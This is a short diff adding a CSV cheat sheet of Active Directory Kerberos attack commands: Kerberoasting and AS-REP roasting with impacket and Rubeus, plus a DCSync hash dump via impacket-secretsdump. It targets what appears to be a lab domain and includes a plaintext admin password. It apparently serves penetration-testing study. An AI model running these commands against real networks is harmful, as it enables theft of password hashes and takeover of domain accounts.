@@ -1,0 +1,5 @@
+kerberos,kerberoast,sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+kerberos,kerberoast,.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+kerberos,AS_rep,impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+kerberos,AS_rep,.\Rubeus.exe asreproast /nowrap
+kerberos,dcsync,impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
